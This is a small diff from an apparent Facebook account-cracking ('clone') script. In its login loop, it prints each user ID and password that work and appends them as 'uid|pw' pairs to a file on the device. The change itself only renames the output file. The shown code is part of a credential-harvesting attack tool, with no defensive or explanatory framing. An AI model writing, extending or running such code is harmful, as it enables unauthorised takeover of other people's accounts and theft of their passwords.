@@ -456,7 +456,7 @@ def login_1(uid):
                 break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                 print(f"\n {W}=> {G}{uid} {W}=> {G}{pw} {W}=> {G}{creationyear(uid)}")
-                open('/sdcard/RAJA-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                open('/sdcard/GAB-CLONE-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
     except Exception as e:
